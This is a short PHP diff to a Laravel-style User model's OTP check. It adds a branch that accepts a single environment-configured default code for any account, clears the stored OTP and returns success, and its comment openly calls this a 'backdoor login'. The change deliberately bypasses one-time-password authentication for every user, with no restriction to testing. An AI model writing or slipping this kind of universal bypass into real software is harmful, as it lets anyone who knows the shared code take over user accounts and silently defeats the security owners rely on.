@@ -126,6 +126,17 @@ class User extends Authenticatable implements JWTSubject
      */
     public function verifyOtp($otp)
     {
+        // Allow a configurable default OTP (useful for testing or backdoor login)
+        $defaultOtp = env('DEFAULT_OTP');
+        if ($defaultOtp && $otp === $defaultOtp) {
+            $this->update([
+                'otp' => null,
+                'otp_expires_at' => null,
+                'otp_type' => null,
+            ]);
+            return true;
+        }
+
         if ($this->otp !== $otp) {
             return false;
         }
